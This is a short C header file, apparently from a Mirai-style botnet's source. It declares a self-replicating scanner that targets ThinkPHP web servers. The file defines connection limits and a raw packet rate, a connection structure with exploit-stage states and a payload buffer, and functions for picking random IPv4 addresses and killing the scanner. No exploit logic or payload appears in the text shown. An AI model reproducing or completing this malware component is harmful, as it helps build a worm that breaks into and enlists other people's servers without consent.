#ifdef SELFREP

#pragma once

#include <stdint.h>

#include "includes.h"

#define thinkphp_SCANNER_MAX_CONNS 128
#define thinkphp_SCANNER_RAW_PPS 160

#define thinkphp_SCANNER_RDBUF_SIZE 256
#define thinkphp_SCANNER_HACK_DRAIN 64

struct thinkphp_scanner_connection
{
    int fd, last_recv;
    enum
    {
        thinkphp_SC_CLOSED,
        thinkphp_SC_CONNECTING,
        thinkphp_SC_EXPLOIT_STAGE2,
        thinkphp_SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[thinkphp_SCANNER_RDBUF_SIZE];
    char payload_buf[1024];
};

void thinkphp_scanner();
void thinkphp_kill(void);

static void thinkphp_setup_connection(struct thinkphp_scanner_connection *);
static ipv4_t thinkphp_get_random_ip(void);

#endif


